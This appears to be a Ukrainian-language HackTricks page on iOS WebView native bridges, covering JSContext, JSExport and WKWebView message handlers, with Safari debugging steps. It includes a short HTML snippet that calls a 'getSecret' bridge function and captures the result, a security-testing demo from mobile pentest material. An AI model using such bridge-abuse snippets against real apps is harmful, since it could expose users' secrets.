## Understanding WebView Native Interfaces in iOS

–ó iOS 7 Apple –Ω–∞–¥–∞–ª–∞ API –¥–ª—è **–∑–≤'—è–∑–∫—É –º—ñ–∂ JavaScript —É WebView —Ç–∞ –Ω–∞—Ç–∏–≤–Ω–∏–º–∏** –æ–±'—î–∫—Ç–∞–º–∏ Swift –∞–±–æ Objective-C. –¶—è —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—è –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è —á–µ—Ä–µ–∑ –¥–≤–∞ –º–µ—Ç–æ–¥–∏:

- **JSContext**: JavaScript-—Ñ—É–Ω–∫—Ü—ñ—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è, –∫–æ–ª–∏ –±–ª–æ–∫ Swift –∞–±–æ Objective-C –ø–æ–≤'—è–∑—É—î—Ç—å—Å—è –∑ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–æ–º —É `JSContext`. –¶–µ –¥–æ–∑–≤–æ–ª—è—î –±–µ–∑–ø–µ—Ä–µ—à–∫–æ–¥–Ω–æ —ñ–Ω—Ç–µ–≥—Ä—É–≤–∞—Ç–∏ —Ç–∞ –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –º—ñ–∂ JavaScript —Ç–∞ –Ω–∞—Ç–∏–≤–Ω–∏–º –∫–æ–¥–æ–º.
- **JSExport Protocol**: –ù–∞—Å–ª—ñ–¥—É—é—á–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª `JSExport`, –Ω–∞—Ç–∏–≤–Ω—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ, –º–µ—Ç–æ–¥–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ —Ç–∞ –º–µ—Ç–æ–¥–∏ –∫–ª–∞—Å—É –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤—ñ–¥–∫—Ä–∏—Ç—ñ –¥–ª—è JavaScript. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –±—É–¥—å-—è–∫—ñ –∑–º—ñ–Ω–∏, –≤–Ω–µ—Å–µ–Ω—ñ –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ JavaScript, –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å—Å—è –≤ –Ω–∞—Ç–∏–≤–Ω–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ, —ñ –Ω–∞–≤–ø–∞–∫–∏. –û–¥–Ω–∞–∫ –≤–∞–∂–ª–∏–≤–æ –ø–µ—Ä–µ–∫–æ–Ω–∞—Ç–∏—Å—è, —â–æ —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ –Ω–µ –≤—ñ–¥–∫—Ä–∏–≤–∞—é—Ç—å—Å—è –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ —á–µ—Ä–µ–∑ —Ü–µ–π –º–µ—Ç–æ–¥.

### Accessing `JSContext` in Objective-C

–í Objective-C `JSContext` –¥–ª—è `UIWebView` –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —Ä—è–¥–∫–∞ –∫–æ–¥—É:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### –°–ø—ñ–ª–∫—É–≤–∞–Ω–Ω—è –∑ `WKWebView`

–î–ª—è `WKWebView` –ø—Ä—è–º–∏–π –¥–æ—Å—Ç—É–ø –¥–æ `JSContext` –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π. –ù–∞—Ç–æ–º—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ø–µ—Ä–µ–¥–∞—á–∞ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—é `postMessage`, —â–æ –¥–æ–∑–≤–æ–ª—è—î JavaScript –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ –Ω–∞—Ç–∏–≤–Ω–∏–º –∫–æ–¥–æ–º. –û–±—Ä–æ–±–Ω–∏–∫–∏ –¥–ª—è —Ü–∏—Ö –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å –Ω–∞–ª–∞—à—Ç–æ–≤—É—é—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º, —â–æ –¥–æ–∑–≤–æ–ª—è—î JavaScript –±–µ–∑–ø–µ—á–Ω–æ –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ –Ω–∞—Ç–∏–≤–Ω–∏–º –¥–æ–¥–∞—Ç–∫–æ–º:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### –í–∑–∞—î–º–æ–¥—ñ—è —Ç–∞ –¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è

JavaScript –º–æ–∂–µ –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ –Ω–∞—Ç–∏–≤–Ω–∏–º —à–∞—Ä–æ–º, –≤–∏–∑–Ω–∞—á–∞—é—á–∏ –æ–±—Ä–æ–±–Ω–∏–∫ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å —Å–∫—Ä–∏–ø—Ç–∞. –¶–µ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –æ–ø–µ—Ä–∞—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ –≤–∏–∫–ª–∏–∫ –Ω–∞—Ç–∏–≤–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π –∑ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
–©–æ–± –∑–∞—Ö–æ–ø–∏—Ç–∏ —Ç–∞ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–º –≤–∏–∫–ª–∏–∫—É –Ω–∞—Ç–∏–≤–Ω–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó, –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª–∏—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ –≤–∏–∫–ª–∏–∫—É –≤ HTML:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
–°—Ç–æ—Ä–æ–Ω–∞ –Ω–∞—Ç–∏–≤–Ω–æ–≥–æ –∫–æ–¥—É –æ–±—Ä–æ–±–ª—è—î –≤–∏–∫–ª–∏–∫ JavaScript, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ –∫–ª–∞—Å—ñ `JavaScriptBridgeMessageHandler`, –¥–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç –æ–ø–µ—Ä–∞—Ü—ñ–π, —Ç–∞–∫–∏—Ö —è–∫ –º–Ω–æ–∂–µ–Ω–Ω—è —á–∏—Å–µ–ª, –æ–±—Ä–æ–±–ª—è—î—Ç—å—Å—è —ñ –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞–∑–∞–¥ –¥–æ JavaScript –¥–ª—è –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∞–±–æ –ø–æ–¥–∞–ª—å—à–æ—ó –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—ó:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## –ù–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è iOS WebViews

(–ü–æ—Å—ñ–±–Ω–∏–∫, –æ—Å–Ω–æ–≤–∞–Ω–∏–π –Ω–∞ [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

–©–æ–± –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –Ω–∞–ª–∞–≥–æ–¥–∂—É–≤–∞—Ç–∏ –≤–µ–±-–∫–æ–Ω—Ç–µ–Ω—Ç —É iOS webviews, –ø–æ—Ç—Ä—ñ–±–Ω–∞ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è, —â–æ –≤–∫–ª—é—á–∞—î —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∞ Safari, –æ—Å–∫—ñ–ª—å–∫–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ –¥–æ `console.log()`, –Ω–µ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å—Å—è –≤ –∂—É—Ä–Ω–∞–ª–∞—Ö Xcode. –û—Å—å —Å–ø—Ä–æ—â–µ–Ω–∏–π –ø–æ—Å—ñ–±–Ω–∏–∫, —â–æ –ø—ñ–¥–∫—Ä–µ—Å–ª—é—î –∫–ª—é—á–æ–≤—ñ –∫—Ä–æ–∫–∏ —Ç–∞ –≤–∏–º–æ–≥–∏:

- **–ü—ñ–¥–≥–æ—Ç–æ–≤–∫–∞ –Ω–∞ –ø—Ä–∏—Å—Ç—Ä–æ—ó iOS**: –ù–µ–æ–±—Ö—ñ–¥–Ω–æ –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ Web Inspector Safari –Ω–∞ –≤–∞—à–æ–º—É –ø—Ä–∏—Å—Ç—Ä–æ—ó iOS. –¶–µ —Ä–æ–±–∏—Ç—å—Å—è —á–µ—Ä–µ–∑ **–ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è > Safari > –î–æ–¥–∞—Ç–∫–æ–≤–æ**, —ñ –≤–≤—ñ–º–∫–Ω–µ–Ω–Ω—è _Web Inspector_.

- **–ü—ñ–¥–≥–æ—Ç–æ–≤–∫–∞ –Ω–∞ –ø—Ä–∏—Å—Ç—Ä–æ—ó macOS**: –ù–∞ –≤–∞—à—ñ–π —Ä–æ–∑—Ä–æ–±–Ω–∏—Ü—å–∫—ñ–π –º–∞—à–∏–Ω—ñ macOS –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–≤—ñ–º–∫–Ω—É—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∞ –≤ Safari. –ó–∞–ø—É—Å—Ç—ñ—Ç—å Safari, –ø–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ **Safari > –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è > –î–æ–¥–∞—Ç–∫–æ–≤–æ**, —ñ –≤–∏–±–µ—Ä—ñ—Ç—å –æ–ø—Ü—ñ—é _–ü–æ–∫–∞–∑–∞—Ç–∏ –º–µ–Ω—é –†–æ–∑—Ä–æ–±–∫–∞_.

- **–ó'—î–¥–Ω–∞–Ω–Ω—è —Ç–∞ –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è**: –ü—ñ—Å–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –≤–∞—à–æ–≥–æ –ø—Ä–∏—Å—Ç—Ä–æ—é iOS –¥–æ –∫–æ–º–ø'—é—Ç–µ—Ä–∞ macOS —ñ –∑–∞–ø—É—Å–∫—É –≤–∞—à–æ–≥–æ –¥–æ–¥–∞—Ç–∫—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ Safari –Ω–∞ –≤–∞—à–æ–º—É –ø—Ä–∏—Å—Ç—Ä–æ—ó macOS, —â–æ–± –≤–∏–±—Ä–∞—Ç–∏ webview, —è–∫–∏–π –≤–∏ —Ö–æ—á–µ—Ç–µ –Ω–∞–ª–∞–≥–æ–¥–∂—É–≤–∞—Ç–∏. –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ _–†–æ–∑—Ä–æ–±–∫–∞_ –≤ –º–µ–Ω—é Safari, –Ω–∞–≤–µ–¥—ñ—Ç—å –∫—É—Ä—Å–æ—Ä –Ω–∞ —ñ–º'—è –≤–∞—à–æ–≥–æ –ø—Ä–∏—Å—Ç—Ä–æ—é iOS, —â–æ–± –ø–æ–±–∞—á–∏—Ç–∏ —Å–ø–∏—Å–æ–∫ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ webview, —ñ –≤–∏–±–µ—Ä—ñ—Ç—å –µ–∫–∑–µ–º–ø–ª—è—Ä, —è–∫–∏–π –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏. –í—ñ–¥–∫—Ä–∏—î—Ç—å—Å—è –Ω–æ–≤–µ –≤—ñ–∫–Ω–æ Web Inspector Safari –¥–ª—è —Ü—ñ—î—ó –º–µ—Ç–∏.

–û–¥–Ω–∞–∫, –±—É–¥—å—Ç–µ —É–≤–∞–∂–Ω—ñ –¥–æ –æ–±–º–µ–∂–µ–Ω—å:

- –ù–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è —Ü–∏–º –º–µ—Ç–æ–¥–æ–º –≤–∏–º–∞–≥–∞—î –ø—Ä–∏—Å—Ç—Ä–æ—é macOS, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–æ –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ Safari.
- –¢—ñ–ª—å–∫–∏ webviews —É –¥–æ–¥–∞—Ç–∫–∞—Ö, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏—Ö –Ω–∞ –≤–∞—à –ø—Ä–∏—Å—Ç—Ä—ñ–π —á–µ—Ä–µ–∑ Xcode, –ø—ñ–¥–ª—è–≥–∞—é—Ç—å –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—é. Webviews —É –¥–æ–¥–∞—Ç–∫–∞—Ö, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—Ö —á–µ—Ä–µ–∑ App Store –∞–±–æ Apple Configurator, –Ω–µ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω—ñ —Ü–∏–º —Å–ø–æ—Å–æ–±–æ–º.


## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
